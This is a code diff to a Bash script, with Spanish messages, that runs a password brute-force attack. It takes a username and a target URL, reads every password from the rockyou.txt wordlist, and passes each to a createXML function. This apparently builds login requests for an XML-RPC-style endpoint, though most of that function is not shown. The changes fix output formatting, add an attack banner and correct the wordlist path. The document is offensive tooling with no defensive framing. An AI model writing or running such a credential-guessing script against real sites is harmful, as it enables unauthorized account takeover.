@@ -10,13 +10,14 @@ trap Ctrl_c INT
 
 if [ $# -ne 2 ]; then
   echo -e "\n[!] No se han proporcionado los argumentos necesarios...\n"
-  echo "\n[+] Uso: $0 usuario URL\n"
+  echo -e "\n[+] Uso: $0 usuario URL\n"
   exit 1
 fi
 
 user=$1
 url=$2
 
+echo -e "\n[i] Realizando ataque de Fuerza Bruta para el usuario: \e[34m$user\e[0m\n"
 
 function createXML(){
   password=$1
@@ -47,6 +48,6 @@ function createXML(){
   fi
 }
 
-cat /opt/share/wordlists/rockyou.txt | while read password; do 
+cat /usr/share/wordlists/rockyou.txt | while read password; do 
   createXML $password $user $url
 done
